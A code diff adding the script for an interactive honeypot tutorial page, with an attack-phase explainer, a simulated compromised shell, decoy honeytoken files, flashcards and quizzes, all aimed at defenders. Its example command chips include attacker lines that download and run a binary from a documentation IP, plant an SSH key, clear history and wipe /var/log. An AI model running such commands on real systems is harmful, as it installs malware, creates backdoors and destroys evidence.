+  {name:"Low interaction",vals:{"Realism":25,"Data collected":25,"Risk":10,"Effort / cost":15,"Detectability":85},
+   desc:"<b>Low:</b> only a banner and a few emulated responses (e.g. a login prompt that always fails). Great for production alerting and counting scans. Example tools: OpenCanary, Dionaea, Honeyd."},
+  {name:"Medium interaction",vals:{"Realism":60,"Data collected":65,"Risk":35,"Effort / cost":50,"Detectability":50},
+   desc:"<b>Medium:</b> fake shell, fake file system, commands produce plausible output; malware is downloaded and saved but never executed. Example: Cowrie. LLM-driven honeypots also live here."},
+  {name:"High interaction",vals:{"Realism":95,"Data collected":95,"Risk":90,"Effort / cost":90,"Detectability":20},
+   desc:"<b>High:</b> a real OS and real services, heavily monitored (keystroke logging, network capture) behind a honeywall. Captures everything, including zero-days — but if containment fails, the attacker owns a real machine."}
+];
+function renderSpec(i){
+  const s=SPEC[i];
+  $("#specMeters").innerHTML=Object.entries(s.vals).map(([k,v])=>`<div class="meter"><span>${k}</span><div class="bar"><i class="${k==="Risk"||k==="Detectability"?"risk":""}" style="width:${v}%"></i></div><span class="small">${v}</span></div>`).join("");
+  $("#specDesc").innerHTML=s.desc;
+}
+// render at 0 then animate widths on change
+$("#specRange").addEventListener("input",e=>{
+  const i=+e.target.value,s=SPEC[i];
+  const bars=$$("#specMeters .bar i");const vals=Object.values(s.vals);
+  bars.forEach((b,j)=>b.style.width=vals[j]+"%");$$("#specMeters .meter .small").forEach((b,j)=>b.textContent=vals[j]);
+  $("#specDesc").innerHTML=s.desc;
+});
+renderSpec(0);
+
+/* ---------- attack phases ---------- */
+const PHASES=[
+  {k:"recon",n:"Reconnaissance",d:"Find out where they are: <code>uname -a</code>, <code>whoami</code>, <code>id</code>, <code>ls</code>, <code>cat /etc/passwd</code>, <code>nproc</code>, <code>free -m</code>. Checking CPU/memory also tells them whether the box is worth mining on — and whether it looks like a honeypot."},
+  {k:"privesc",n:"Privilege escalation",d:"Try to become root: <code>sudo -l</code>, <code>sudo su</code>, searching for SUID binaries, running known kernel exploits."},
+  {k:"persist",n:"Persistence",d:"Prepare the next visit: create users, add SSH keys to <code>authorized_keys</code>, add cron jobs or services."},
+  {k:"steal",n:"Data stealing",d:"Look for passwords, databases, config files, cloud keys. This is why you place fake data (honeytokens) inside honeypots."},
+  {k:"malware",n:"Malware installation",d:"Download and run payloads: crypto miners, botnet clients (e.g. Mirai variants), ransomware. Bots usually <code>wget</code>/<code>curl</code> a script from a fixed IP and run it."},
+  {k:"cover",n:"Covering tracks",d:"Experienced attackers erase evidence: <code>history -c</code>, <code>unset HISTFILE</code>, deleting <code>/var/log</code>. A honeypot logs outside the system, so this fails silently."}
+];
+const stepper=$("#phaseStepper");
+PHASES.forEach((p,i)=>{const b=document.createElement("button");b.className="btn";b.textContent=(i+1)+". "+p.n;b.onclick=()=>showPhase(i);stepper.appendChild(b);});
+function showPhase(i){$$("button",stepper).forEach((b,j)=>b.classList.toggle("on",j===i));$("#phaseInfo").innerHTML=`<span class="tag ${PHASES[i].k}">${PHASES[i].n}</span><br>${PHASES[i].d}`;}
+showPhase(0);
+$("#phaseBar").innerHTML=PHASES.map(p=>`<span data-k="${p.k}">${p.n}</span>`).join("");
+
+/* ---------- terminal simulator ---------- */
+const term={cwd:"/root",created:{},hits:{}};
+const FS={
+  "/":["bin","boot","dev","etc","home","opt","proc","root","tmp","usr","var"],
+  "/root":[".bash_history",".ssh/","backup/","notes.txt"],
+  "/root/.ssh":["authorized_keys","known_hosts"],
+  "/root/backup":["db_backup_2025-03.sql"],
+  "/etc":["hostname","os-release","passwd","shadow","ssh/","crontab"],
+  "/var":["log/","www/","lib/","cache/"],
+  "/var/www":["html/"],
+  "/var/www/html":["index.php","config.php","uploads/"],
+  "/var/log":["auth.log","syslog","nginx/"],
+  "/home":["deploy/"],"/home/deploy":[".aws/",".profile"],"/home/deploy/.aws":["credentials"],
+  "/tmp":[]
+};
+const FILES={
+  "/etc/hostname":"web-prod-02",
+  "/etc/os-release":'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"',
+  "/etc/passwd":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:112:117:MySQL Server:/nonexistent:/bin/false\ndeploy:x:1000:1000:Deploy User:/home/deploy:/bin/bash",
+  "/etc/shadow":"root:$6$Qx9...truncated...:19790:0:99999:7:::\ndeploy:$6$aL2...truncated...:19790:0:99999:7:::",
+  "/etc/crontab":"# m h dom mon dow user command\n17 *  * * *  root  cd / && run-parts --report /etc/cron.hourly",
+  "/root/notes.txt":"TODO: rotate db password after migration\nbackup is in ~/backup, aws creds for deploy user in /home/deploy/.aws",
+  "/root/.bash_history":"mysql -u app_admin -p\nsystemctl restart nginx\nvim /var/www/html/config.php\nexit",
+  "/root/.ssh/authorized_keys":"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM...admin@laptop",
+  "/root/.ssh/known_hosts":"|1|abc...= ecdsa-sha2-nistp256 AAAA...",
+  "/var/www/html/index.php":"<?php require 'config.php'; /* shop frontend */ ?>",
+  "/var/www/html/config.php":"<?php\n$db_host = 'db-internal.corp.local';\n$db_user = 'app_admin';\n$db_pass = 'Gx7!pQ2r#Shop2025';\n?>",
+  "/root/backup/db_backup_2025-03.sql":"INSERT INTO customers VALUES (1,'Ayşe Demir','ayse.d@example.com');\nINSERT INTO customers VALUES (2,'Mehmet Yilmaz','mehmet.y.7731@example.com');\n-- 48,213 more rows",
+  "/home/deploy/.aws/credentials":"[default]\naws_access_key_id = AKIA4EXAMPLEDECOY77\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "/var/log/auth.log":"Mar 12 09:14:02 web-prod-02 sshd[1123]: Accepted publickey for deploy from 10.0.4.12\n..."
+};
+const TOKENS={"/var/www/html/config.php":"Fake DB credentials (app_admin) read","/root/backup/db_backup_2025-03.sql":"Decoy customer backup opened (contains token row #2)","/home/deploy/.aws/credentials":"Decoy AWS access key read — any API call with it will also alert"};
+const out=$("#termOut"),inp=$("#termIn");
+function print(t,cls){const s=document.createElement("div");if(cls)s.className=cls;s.textContent=t;out.appendChild(s);out.scrollTop=out.scrollHeight;}
+function promptStr(){const bad=$("#badMode").checked;return `root@${bad?"svr04":"web-prod-02"}:${term.cwd.replace(/^\/root/,"~")}#`;}
+function logEv(cmd,tag,extra){
+  const rows=$("#logRows");const r=document.createElement("div");r.className="row";
+  const ts=new Date().toISOString().substr(11,8);
+  const lbl={recon:"recon",privesc:"priv-esc",persist:"persistence",steal:"data theft",malware:"malware",cover:"cover tracks",token:"HONEYTOKEN",info:"info"}[tag]||tag;
+  r.innerHTML=`<span class="small">${ts}</span> <span class="small">198.51.100.23</span> <span class="tag ${tag}">${lbl}</span><br>$ ${esc(cmd)}${extra?`<br><span class="small">↳ ${esc(extra)}</span>`:""}`;
+  rows.prepend(r);
+  if(tag!=="info"&&tag!=="token"){const s=$(`#phaseBar span[data-k="${tag}"]`);if(s)s.classList.add("hit");}
+}
+function resolve(p){
+  if(!p||p==="~")return "/root";
+  if(p.startsWith("~"))p="/root"+p.slice(1);
+  if(!p.startsWith("/"))p=(term.cwd==="/"?"":term.cwd)+"/"+p;
+  const parts=[];p.split("/").forEach(x=>{if(!x||x===".")return;if(x==="..")parts.pop();else parts.push(x);});
+  return "/"+parts.join("/");
+}
+let alertTimer;
+function showAlert(title,body){$("#alertTitle").textContent=title;$("#alertBody").textContent=body;const a=$("#alert");a.classList.add("show");clearTimeout(alertTimer);alertTimer=setTimeout(()=>a.classList.remove("show"),4200);}
+function run(raw){
+  const cmd=raw.trim();print(promptStr()+" "+cmd,"p");if(!cmd)return;
+  const bad=$("#badMode").checked;
+  const [c,...args]=cmd.split(/\s+/);const a=args.join(" ");
+  const delay=bad?0:(c==="wget"||c==="curl"?900:60+Math.random()*120);
+  inp.disabled=true;
+  setTimeout(()=>{exec(cmd,c,args,a,bad);inp.disabled=false;inp.focus({preventScroll:true});$("#termPrompt").textContent=promptStr();},delay);
+}
+function exec(cmd,c,args,a,bad){
+  // redirection writes
+  let m=cmd.match(/^echo\s+(.*?)\s*(>>?)\s*(\S+)$/);
+  if(m){const path=resolve(m[3]);
+    if(path.endsWith("authorized_keys")){logEv(cmd,"persist","SSH key planted for future access");if(!bad)term.created[path]=(FILES[path]||"")+"\n"+m[1];return;}
+    if(!bad){term.created[path]=(m[2]===">>"&&(term.created[path]||FILES[path])?(term.created[path]||FILES[path])+"\n":"")+m[1].replace(/^["']|["']$/g,"");const dir=path.replace(/\/[^/]+$/,"")||"/";FS[dir]=FS[dir]||[];const nm=path.split("/").pop();if(!FS[dir].includes(nm))FS[dir].push(nm);}
+    logEv(cmd,"info","file write recorded");return;}
+  switch(c){
+    case "help":print("Try: whoami, id, uname -a, ls -la, cd, cat, ps aux, nproc, free -m, sudo -l, wget, useradd, crontab -l, history -c, rm -rf /var/log, exit\n(Everything is simulated — nothing runs on your computer.)","dim");return;
+    case "whoami":print("root");logEv(cmd,"recon");return;
+    case "id":print("uid=0(root) gid=0(root) groups=0(root)");logEv(cmd,"recon");return;
+    case "hostname":print(bad?"svr04":"web-prod-02");logEv(cmd,"recon",bad?"default Cowrie hostname — known fingerprint!":"");return;
+    case "uname":print(bad?"Linux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux":"Linux web-prod-02 5.15.0-105-generic #115-Ubuntu SMP Mon Apr 15 09:52:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux");logEv(cmd,"recon",bad?"ancient kernel + default hostname = suspicious":"");return;
+    case "pwd":print(term.cwd);logEv(cmd,"recon");return;
+    case "w":case "uptime":print(bad?" 00:00:01 up 0 min,  1 user,  load average: 0.00, 0.00, 0.00":" 10:42:17 up 41 days,  3:12,  1 user,  load average: 0.31, 0.27, 0.22");logEv(cmd,"recon",bad?"uptime 0 min — freshly spawned box?":"");return;
+    case "ls":{const t=resolve(args.filter(x=>!x.startsWith("-"))[0]||term.cwd);const L=FS[t];
+      if(bad){print("");logEv(cmd,"recon","empty listing — looks fake");return;}
+      if(!L){print(`ls: cannot access '${t}': No such file or directory`);return;}
+      if(args.some(x=>x.includes("l")))print("total "+(L.length*4)+"\n"+L.map(f=>(f.endsWith("/")?"drwxr-xr-x 2 root root 4096":"-rw-r--r-- 1 root root  "+String(Math.floor(200+f.length*37)).padStart(4))+" Mar 12 09:1"+(f.length%10)+" "+f.replace(/\/$/,"")).join("\n"));
+      else print(L.map(f=>f.replace(/\/$/,"")).join("  "));
+      logEv(cmd,"recon");return;}
+    case "cd":{const t=resolve(args[0]||"~");if(FS[t]){term.cwd=t;}else print(`bash: cd: ${args[0]}: No such file or directory`);return;}
+    case "cat":case "less":case "more":case "head":case "tail":{
+      const t=resolve(args.filter(x=>!x.startsWith("-"))[0]);
+      if(t==="/proc/cpuinfo"){print(bad?"processor\t: 0\nmodel name\t: QEMU Virtual CPU version 2.5+":"processor\t: 0\nmodel name\t: Intel(R) Xeon(R) Gold 6248R CPU @ 3.00GHz\ncpu cores\t: 4\n... (3 more)");logEv(cmd,"recon",bad?"QEMU CPU — virtual sandbox?":"");return;}
+      let content=term.created[t]!==undefined?term.created[t]:FILES[t];
+      if(bad&&term.created[t]!==undefined)content="";
+      if(content===undefined){print(`${c}: ${args[0]}: No such file or directory`);return;}
+      print(content);
+      if(TOKENS[t]){logEv(cmd,"token",TOKENS[t]);showAlert("HONEYTOKEN TRIGGERED",TOKENS[t]+" from 198.51.100.23");logEv(cmd,"steal");}
+      else if(/passwd|shadow|history|notes|auth/.test(t))logEv(cmd,t.includes("shadow")?"steal":"recon");
+      else logEv(cmd,"info",bad&&term.created[t]!==undefined?"file you just wrote is empty — inconsistent state!":"");
+      return;}
+    case "ps":print("USER  PID %CPU %MEM COMMAND\nroot    1  0.0  0.1 /sbin/init\nroot  612  0.0  0.3 /usr/sbin/sshd -D\nmysql 744  0.4  6.1 /usr/sbin/mysqld\nwww-d 803  0.1  1.2 nginx: worker process\nroot 2231  0.0  0.1 -bash");logEv(cmd,"recon");return;
+    case "ifconfig":case "ip":print("eth0: inet 10.0.4.27  netmask 255.255.255.0  broadcast 10.0.4.255\nlo: inet 127.0.0.1");logEv(cmd,"recon","internal subnet 10.0.4.0/24 revealed (decoy)");return;
+    case "nproc":print(bad?"1":"4");logEv(cmd,"recon",bad?"single core — weak for mining, suspicious":"checking if worth crypto-mining");return;
+    case "free":print(bad?"              total   used   free\nMem:              0      0      0":"              total   used   free  shared  buff/cache  available\nMem:          15987   4120   6012     211        5855      11301\nSwap:          2047      0   2047");logEv(cmd,"recon",bad?"0 MB memory — obviously fake":"");return;
+    case "sudo":print(a.startsWith("-l")?"User root may run the following commands on web-prod-02:\n    (ALL : ALL) ALL":"");logEv(cmd,"privesc");return;
+    case "su":logEv(cmd,"privesc");return;
+    case "find":print("/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/su\n/usr/lib/openssh/ssh-keysign");logEv(cmd,"privesc","SUID binary search");return;
+    case "wget":case "curl":{const url=args.find(x=>/^(https?:)?\/?\/?[\w.-]+/.test(x)&&!x.startsWith("-"))||"http://203.0.113.66/x.sh";
+      const name=url.split("/").pop()||"index.html";
+      print(c==="wget"?`--${new Date().toISOString().substr(0,19).replace("T"," ")}--  ${url}\nConnecting to ${url.replace(/^https?:\/\//,"").split("/")[0]}... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 48210 (47K) [application/octet-stream]\nSaving to: '${name}'\n\n'${name}' saved [48210/48210]`:"#!/bin/sh\n# (payload content captured by honeypot)");
+      FS[term.cwd]=FS[term.cwd]||[];if(!FS[term.cwd].includes(name))FS[term.cwd].push(name);
+      logEv(cmd,"malware",`sample stored for analysis — sha256 ${Array.from({length:16},()=>"0123456789abcdef"[Math.random()*16|0]).join("")}…`);return;}
+    case "chmod":logEv(cmd,"malware","preparing payload for execution");return;
+    case "sh":case "bash":case "python3":case "perl":logEv(cmd,"malware","execution attempt — payload NOT actually run");print("");return;
+    case "useradd":case "adduser":logEv(cmd,"persist","backdoor account created");return;
+    case "passwd":print("New password: \nRetype new password: \npasswd: password updated successfully");logEv(cmd,"persist","password change attempt (password captured)");return;
+    case "crontab":print(a.includes("-l")?"no crontab for root":"crontab: installing new crontab");logEv(cmd,"persist","cron-based persistence");return;
+    case "history":if(a.includes("-c")){logEv(cmd,"cover","history cleared — but the honeypot already logged it");}else{print("    1  "+(FILES["/root/.bash_history"].split("\n").join("\n    2  ")));logEv(cmd,"recon");}return;
+    case "unset":logEv(cmd,"cover","disabling shell history");return;
+    case "rm":logEv(cmd,"cover",/log/.test(a)?"log deletion — remote logs are untouched":"file deletion");return;
+    case "export":logEv(cmd,"cover");return;
+    case "mysql":print("ERROR 2003 (HY000): Can't connect to MySQL server on 'db-internal.corp.local' (110)");logEv(cmd,"steal","tried to reach internal DB with stolen creds");return;
+    case "exit":case "logout":print("Connection to 203.0.113.50 closed.","dim");logEv(cmd,"info","session ended — full transcript saved");return;
+    case "clear":out.innerHTML="";return;
+    default:if(c.startsWith("./")){logEv(cmd,"malware","execution attempt — payload NOT actually run");print("");return;}
+      print(`bash: ${c}: command not found`);logEv(cmd,"info","unknown command");
+  }
+}
+inp.addEventListener("keydown",e=>{if(e.key==="Enter"){const v=inp.value;inp.value="";run(v);}});
+$("#term").addEventListener("click",()=>inp.focus());
+["whoami","uname -a","ls -la","cat notes.txt","nproc","free -m","sudo -l","cat /var/www/html/config.php","cat /home/deploy/.aws/credentials","wget http://203.0.113.66/bins/x86","chmod +x x86","./x86","useradd -m support","echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys","history -c","rm -rf /var/log/*","echo hello > test.txt","cat test.txt"].forEach(s=>{
+  const b=document.createElement("button");b.className="chip";b.textContent=s;b.onclick=()=>run(s);$("#termChips").appendChild(b);});
+$("#logClear").onclick=()=>{$("#logRows").innerHTML="";$$("#phaseBar span").forEach(s=>s.classList.remove("hit"));};
+$("#badMode").addEventListener("change",()=>{$("#termPrompt").textContent=promptStr();print($("#badMode").checked?"[instructor] poor-realism mode ON — try hostname, uname -a, free -m, ls, then echo/cat a file":"[instructor] realistic mode ON","dim");});
+print("Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\nLast login: Tue Mar 12 09:14:02 2025 from 10.0.4.12\nType 'help' for ideas.","dim");
+logEv("ssh root@203.0.113.50","info","login accepted with password 'admin123' (brute-force, attempt #412)");
+
+/* ---------- honeytoken file share ---------- */
+const SHARE={
+  "Finance":[{n:"Q3_budget_draft.xlsx",i:"📊",c:"Department  | Q3 budget\nIT          | 1,240,000 TRY\nMarketing   |   830,000 TRY"},
+             {n:"financial_report_2025.docx",i:"📄",t:1,c:"[Opening this document silently requested a unique tracking URL → the alert fired.]\n\nCONFIDENTIAL — Annual financial report..."},
+             {n:"invoices_march.pdf",i:"📕",c:"Invoice #2025-0311 — Office supplies — 4,120 TRY"}],
+  "HR":[{n:"salaries_2025.xlsx",i:"📊",t:1,c:"[Decoy spreadsheet with an embedded canary — opening it pinged the monitoring server.]\n\nName | Position | Salary\n..."},
+        {n:"onboarding_checklist.docx",i:"📄",c:"1. Collect ID copy\n2. Create accounts\n3. Security training"},
+        {n:"employee_list.csv",i:"🧾",c:"id,name,email\n101,Ayşe Demir,ayse.d@corp.local\n102,Can Öztürk,can.o@corp.local\n999,Selin Kaya,selin.kaya.ht@corp.local   <- (honeytoken row: this mailbox does not exist)"}],
+  "IT":[{n:"passwords.xlsx",i:"🔑",t:1,c:"[Classic bait. Any open is an alert.]\n\nSystem | User | Password\nVPN    | admin | Winter2025!\nFirewall | root | ..."},
+        {n:"network_diagram.png",i:"🖼",c:"(image of the office network — real file)"},
+        {n:"deploy_keys.env",i:"⚙",t:1,c:"AWS_ACCESS_KEY_ID=AKIA4EXAMPLEDECOY77\nAWS_SECRET_ACCESS_KEY=wJalrXUt...\n\n[This key has no permissions. Any API call with it is logged by the cloud provider and raises an alert.]"},
+        {n:"printer_drivers.zip",i:"🗜",c:"(driver archive — boring, real)"}]
+};
+let fxSel="Finance",opened=new Set(),tripped=new Set(),revealed=false;
+function fxRender(){
+  $("#fxTree").innerHTML=Object.keys(SHARE).map(k=>`<div data-k="${k}" class="${k===fxSel?"sel":""}">📁 ${k}</div>`).join("");
+  $$("#fxTree div").forEach(d=>d.onclick=()=>{fxSel=d.dataset.k;fxRender();});
+  $("#fxFiles").innerHTML=SHARE[fxSel].map((f,i)=>`<div class="file ${revealed&&f.t?"reveal-token":""}" data-i="${i}"><span class="ic">${f.i}</span><span>${f.n}</span>${revealed&&f.t?'<span class="tag token" style="margin-left:auto">honeytoken</span>':""}${opened.has(fxSel+f.n)&&!(revealed&&f.t)?'<span class="small" style="margin-left:auto">opened</span>':""}</div>`).join("");
+  $$("#fxFiles .file").forEach(el=>el.onclick=()=>{const f=SHARE[fxSel][+el.dataset.i];opened.add(fxSel+f.n);$("#fxPreview").textContent=f.c;
+    if(f.t){tripped.add(f.n);showAlert("HONEYTOKEN TRIGGERED",`${f.n} opened on \\\\fileserver\\${fxSel} by user j.doe from 10.0.4.88`);}
+    fxScore();fxRender();});
+}
+function fxScore(){const total=Object.values(SHARE).flat().filter(f=>f.t).length;$("#fxScore").textContent=`Files opened: ${opened.size} · alerts you triggered: ${tripped.size}`+(revealed?` · honeytokens in share: ${total}`:"");}
+$("#fxReveal").onclick=()=>{revealed=!revealed;$("#fxReveal").textContent=revealed?"Hide honeytokens":"Reveal honeytokens";fxRender();fxScore();};
+fxRender();
+
+/* ---------- flashcards ---------- */
+[["Honeypot","A decoy system or service that attackers interact with, so we can detect and study them."],
+ ["Honeytoken","A decoy piece of data (credential, file, record, email) that alerts when touched."],
+ ["Honeynet","A network of honeypots imitating a whole environment; shows lateral movement."],
+ ["Honeyfarm","Many honeypots/honeynets under central, automated management, often distributed."],
+ ["Shadow honeypot","A dormant copy of the real app; traffic flagged by an IDS is diverted to it in real time."],
+ ["Honeywall","Gateway in front of a honeynet providing data control, data capture and data analysis."],
+ ["Fingerprinting","Attacker techniques to detect that a system is a honeypot (defaults, timing, inconsistencies)."],
+ ["Canary token","Popular name for a honeytoken that ‘phones home’ (e.g. a URL, DNS name or document)."],
+ ["Data control","Limiting what a compromised honeypot can send out, so it cannot attack others."]].forEach(([f,b])=>{
+  const d=document.createElement("div");d.className="flip";d.tabIndex=0;d.innerHTML=`<div class="in"><div class="f">${f}</div><div class="b">${b}</div></div>`;
+  d.onclick=()=>d.classList.toggle("on");d.onkeydown=e=>{if(e.key==="Enter"||e.key===" "){e.preventDefault();d.classList.toggle("on");}};$("#flips").appendChild(d);});
+
+/* ---------- honeyfarm diagram ---------- */
+const FARM={
+  mgmt:"<b>Central management server</b> — one place to configure, deploy and update hundreds of honeypots (images, banners, fake data, rotation of honeytokens). Without it, a large deployment becomes stale and easy to fingerprint.",
+  sensors:"<b>Distributed sensors</b> — lightweight honeypots and honeynets placed in many networks, countries or cloud regions. Some only capture the first packets and forward interesting connections to the farm’s high-interaction systems.",
+  core:"<b>Honeyfarm core</b> — a pool of (usually virtualised) honeypots that can be spun up on demand, e.g. one VM per attacker, then reset. This lets a few servers pretend to be thousands of machines.",
+  agg:"<b>Data aggregation layer</b> — collects logs, telemetry and attack data (pcaps, commands, malware samples) from every sensor into one store, normalised so it can be searched.",
+  analysis:"<b>Analysis engines</b> — machine learning (clustering campaigns, anomaly detection), statistical analysis (top IPs, credentials, trends) and manual investigation by analysts. Output: threat intelligence, IDS signatures, blocklists, reports."
+};
+$$("#farmSvg .clickable").forEach(g=>g.addEventListener("click",()=>{$$("#farmSvg .clickable").forEach(x=>x.classList.remove("on"));g.classList.add("on");$("#farmInfo").innerHTML=FARM[g.dataset.k];}));
+
+/* ---------- shadow honeypot sim ---------- */
+const REQ={
+  ok:{mal:false,info:"Normal request → IDS finds nothing unusual → served by production."},
+  ok2:{mal:false,info:"Normal login → production. Real users never notice the shadow exists."},
+  bad:{mal:true,info:"Classic SQL injection pattern → IDS flags it → diverted to the shadow copy. The attacker gets a realistic response; every query and payload is logged; production data is never touched."},
+  bad2:{mal:true,info:"Path traversal attempt → diverted to shadow. The attacker sees a convincing (fake) /etc/passwd and keeps going, revealing more of their toolkit."},
+  fp:{mal:true,fp:true,info:"The apostrophe in ‘O’Brien’ looks like SQL injection → flagged → handled by the shadow. The shadow processes it normally; analysis shows it was benign, so the state is kept and the user was never blocked. This is how shadow honeypots tolerate IDS false positives."}
+};
+let cP=0,cS=0,cL=0,shadowT;
+const NS="http://www.w3.org/2000/svg";
+function animPacket(pts,color,done){
+  const c=document.createElementNS(NS,"circle");c.setAttribute("r","7");c.setAttribute("fill",color);c.setAttribute("stroke","#fff");c.setAttribute("stroke-width","1.5");$("#packets").appendChild(c);
+  const segs=[];let total=0;for(let i=0;i<pts.length-1;i++){const d=Math.hypot(pts[i+1][0]-pts[i][0],pts[i+1][1]-pts[i][1]);segs.push(d);total+=d;}
+  const dur=1400;const t0=performance.now();
+  function f(now){let k=Math.min(1,(now-t0)/dur),dist=k*total,i=0;while(i<segs.length-1&&dist>segs[i]){dist-=segs[i];i++;}
+    const r=Math.min(1,dist/segs[i]),x=pts[i][0]+(pts[i+1][0]-pts[i][0])*r,y=pts[i][1]+(pts[i+1][1]-pts[i][1])*r;c.setAttribute("cx",x);c.setAttribute("cy",y);
+    if(k<1)requestAnimationFrame(f);else{c.remove();done&&done();}}
+  requestAnimationFrame(f);
+}
+$$(".shadow-ctl button").forEach(b=>b.onclick=()=>{
+  const r=REQ[b.dataset.req];$("#shadowInfo").innerHTML="⏳ "+esc(b.textContent)+" …";
+  if(!r.mal){animPacket([[95,115],[300,115],[520,50]],"var(--ok)",()=>{cP++;$("#cProd").textContent=cP;$("#shadowInfo").innerHTML="<b>"+esc(b.textContent)+"</b><br>"+r.info;});}
+  else{
+    $("#shadowBox").style.opacity=1;$("#shadowState").textContent="spinning up…";$("#shadowWire").classList.add("flow");
+    animPacket([[95,115],[300,115],[520,180]],r.fp?"var(--honey)":"var(--bad)",()=>{cS++;if(!r.fp)cL++;$("#cShadow").textContent=cS;$("#cLog").textContent=cL;$("#shadowState").textContent=r.fp?"benign → state kept":"logging attack";$("#shadowInfo").innerHTML="<b>"+esc(b.textContent)+"</b><br>"+r.info;
+      clearTimeout(shadowT);shadowT=setTimeout(()=>{$("#shadowBox").style.opacity=.35;$("#shadowState").textContent="idle";$("#shadowWire").classList.remove("flow");},3500);});
+  }
+});
+
+/* ---------- inline quizzes ---------- */
+$$(".quiz[data-id]").forEach(q=>{
+  const id=q.dataset.id,ans=+q.dataset.answer,opts=$$(".opt",q),fb=$(".fb",q);
+  function mark(i,silent){opts.forEach((o,j)=>{o.disabled=true;if(j===ans)o.classList.add("right");if(j===i&&i!==ans)o.classList.add("wrong");});
+    fb.innerHTML=(i===ans?"<b style='color:var(--ok)'>Correct.</b> ":"<b style='color:var(--bad)'>Not quite.</b> ")+fb.dataset.base+` <button class="btn" style="padding:2px 8px;font-size:.78rem;margin-left:6px">try again</button>`;fb.classList.add("show");
+    $("button",fb).onclick=()=>{delete state.quiz[id];save();opts.forEach(o=>{o.disabled=false;o.classList.remove("right","wrong");});fb.classList.remove("show");};
+    if(!silent){state.quiz[id]=i;save();}}
+  fb.dataset.base=fb.innerHTML;
+  opts.forEach((o,i)=>o.onclick=()=>mark(i));
+  if(state.quiz[id]!==undefined)mark(state.quiz[id],true);
+});
+
+/* ---------- final quiz ---------- */
+const FQ=[
+  ["What is the main purpose of a research honeypot?",["Hosting the company website","Learning attacker tools and techniques","Replacing the firewall","Encrypting data"],1],
+  ["Which statement about honeytokens is FALSE?",["They have no legitimate use","They can be fake database rows","They require a full fake server to work","Any access to them is suspicious"],2],
+  ["A medium-interaction SSH honeypot such as Cowrie typically…",["Runs the attacker’s malware on a real kernel","Provides a fake shell and captures downloaded files without executing them","Only shows a login banner","Is invisible to all scanners"],1],
+  ["Why do attackers run nproc, free -m and cat /proc/cpuinfo?",["To install updates","To check resources (worth mining?) and spot sandbox/honeypot clues","To clear their tracks","To create persistence"],1],
+  ["What does a honeywall’s ‘data control’ do?",["Encrypts logs","Prevents the honeynet from attacking third parties","Generates fake files","Detects zero-days automatically"],1],
+  ["What distinguishes a honeyfarm from a honeynet?",["A honeyfarm has no honeypots","A honeyfarm is many honeypots/honeynets under centralised, automated management","A honeyfarm only uses honeytokens","There is no difference"],1],
+  ["When is a shadow honeypot active?",["All the time, exposed to the internet","Only when the IDS flags traffic as suspicious","Only at night","Only after a breach is confirmed"],1],
+  ["Which is the best honeytoken file name?",["honeytoken_trap.txt","fake_passwords_do_not_open.xlsx","vpn_admin_passwords_2025.xlsx","test.txt"],2],
+  ["An attacker runs history -c and rm -rf /var/log/* inside your honeypot. What is lost?",["Everything — the session is gone","Nothing for the defender, because logging happens outside the honeypot","Only the malware sample","The honeytoken stops working"],1],
+  ["Using honeypot data to break into the attacker’s own machine is…",["Recommended best practice","Called ‘data capture’","Hack-back — generally illegal; report instead","Required by GDPR/KVKK"],2]
+];
+function renderFinal(){
+  const fq=$("#finalQuiz");
+  fq.innerHTML=`<b>Final quiz — ${FQ.length} questions</b><p class="small">Your answers are saved. Press “Check answers” when done.</p>`+FQ.map((q,i)=>`<div class="quiz" style="box-shadow:none"><div class="qh">Question ${i+1}</div><div class="q">${esc(q[0])}</div><div class="opts">${q[1].map((o,j)=>`<button class="opt" data-q="${i}" data-o="${j}">${esc(o)}</button>`).join("")}</div></div>`).join("")+
+  `<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap"><button class="btn primary" id="fqCheck">Check answers</button><button class="btn" id="fqReset">Clear</button><b id="fqScore"></b></div>`;
+  $$(".opt",fq).forEach(b=>{const qi=+b.dataset.q,oi=+b.dataset.o;if(state.final[qi]===oi)b.style.borderColor="var(--accent)",b.style.background="var(--accent-soft)";
+    b.onclick=()=>{if(fq.dataset.checked)return;state.final[qi]=oi;save();$$(`.opt[data-q="${qi}"]`,fq).forEach(x=>{x.style.borderColor="";x.style.background="";});b.style.borderColor="var(--accent)";b.style.background="var(--accent-soft)";};});
+  $("#fqCheck").onclick=()=>{let s=0;fq.dataset.checked=1;FQ.forEach((q,i)=>{$$(`.opt[data-q="${i}"]`,fq).forEach(x=>{x.style.borderColor="";x.style.background="";x.disabled=true;const o=+x.dataset.o;if(o===q[2])x.classList.add("right");else if(state.final[i]===o)x.classList.add("wrong");});if(state.final[i]===q[2])s++;});
+    state.finalScore=s;save();$("#fqScore").textContent=`Score: ${s} / ${FQ.length}`+(s===FQ.length?" — excellent! 🍯":"");};
+  $("#fqReset").onclick=()=>{state.final={};delete state.finalScore;save();delete fq.dataset.checked;renderFinal();};
+}
+renderFinal();
+
+/* ---------- copy code ---------- */
+$("#copyCode").onclick=()=>{const t=$("#codeBlock").innerText;const done=()=>{$("#copyCode").textContent="Copied ✓";setTimeout(()=>$("#copyCode").textContent="Copy code",1500);};
+  if(navigator.clipboard&&window.isSecureContext)navigator.clipboard.writeText(t).then(done,fallback);else fallback();
+  function fallback(){const ta=document.createElement("textarea");ta.value=t;document.body.appendChild(ta);ta.select();try{document.execCommand("copy");done();}catch(e){}ta.remove();}};
+
+/* ---------- export / import / print / reset ---------- */
